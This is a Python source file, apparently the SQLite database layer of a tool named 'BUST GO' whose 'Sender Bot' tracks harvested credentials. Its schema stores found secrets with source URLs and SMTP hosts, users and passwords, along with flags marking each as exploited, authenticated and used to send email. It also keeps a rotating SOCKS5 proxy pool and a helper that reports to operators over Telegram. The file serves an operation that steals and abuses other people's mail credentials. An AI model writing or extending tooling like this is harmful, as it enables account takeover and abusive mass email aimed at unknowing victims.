"""
BUST GO — Database layer (SQLite).
Lightweight DB access for the Sender Bot.
Manages found_creds, campaigns, settings.
"""
from __future__ import annotations

import os
import sqlite3
import time

import httpx

DEFAULT_DB = os.getenv("BUSTGO_HUNT_DB", "bustgo-hunt.db")

SCHEMA = """
CREATE TABLE IF NOT EXISTS found_creds (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    domain TEXT NOT NULL, provider TEXT, cred_type TEXT, value TEXT NOT NULL,
    source_url TEXT, source_type TEXT, context TEXT,
    smtp_host TEXT, smtp_port INTEGER, smtp_user TEXT, smtp_password TEXT,
    found_at REAL NOT NULL, exploited INTEGER DEFAULT 0,
    auth_ok INTEGER DEFAULT 0, email_sent INTEGER DEFAULT 0,
    exploit_error TEXT, notified INTEGER DEFAULT 0
);
CREATE INDEX IF NOT EXISTS idx_creds_domain ON found_creds(domain);
CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT NOT NULL);
CREATE TABLE IF NOT EXISTS proxies (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    url TEXT NOT NULL UNIQUE,
    proxy_type TEXT NOT NULL DEFAULT 'socks5',
    host TEXT NOT NULL,
    port INTEGER NOT NULL,
    username TEXT DEFAULT '',
    password TEXT DEFAULT '',
    label TEXT DEFAULT '',
    is_active INTEGER DEFAULT 1,
    last_check REAL,
    last_error TEXT DEFAULT '',
    success_count INTEGER DEFAULT 0,
    fail_count INTEGER DEFAULT 0,
    added_at REAL NOT NULL
);
"""


class DomainQueue:
    """Minimal DB wrapper — only settings + found_creds access for Sender Bot."""

    def __init__(self, db_path: str = DEFAULT_DB):
        self.db = sqlite3.connect(db_path, timeout=30, check_same_thread=False)
        self.db.row_factory = sqlite3.Row
        self.db.execute("PRAGMA journal_mode=WAL")
        self.db.execute("PRAGMA synchronous=NORMAL")
        self.db.execute("PRAGMA busy_timeout=120000")
        self.db.executescript(SCHEMA)
        self.db.commit()

    def get_setting(self, key: str) -> str | None:
        row = self.db.execute("SELECT value FROM settings WHERE key=?", (key,)).fetchone()
        return row["value"] if row else None

    def set_setting(self, key: str, value: str):
        with self.db:
            self.db.execute("INSERT OR REPLACE INTO settings(key,value) VALUES (?,?)", (key, value))

    def recent_creds(self, limit: int = 20) -> list[dict]:
        return [dict(r) for r in self.db.execute(
            "SELECT domain,provider,value,source_url,source_type,smtp_host,smtp_port,smtp_user,smtp_password,auth_ok,email_sent,found_at FROM found_creds ORDER BY found_at DESC LIMIT ?", (limit,)).fetchall()]

    def close(self):
        self.db.close()


def send_telegram(text: str, chat_id: int | None = None):
    token = os.environ.get("TELEGRAM_BOT_TOKEN", "") or os.environ.get("SENDER_BOT_TOKEN", "")
    if not token:
        return
    targets = [chat_id] if chat_id else [int(x) for x in os.environ.get("SENDER_ADMIN_IDS", "").split(",") if x.strip().isdigit()]
    for cid in targets:
        try:
            httpx.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": cid, "text": text[:4000]}, timeout=15)
        except Exception:
            pass
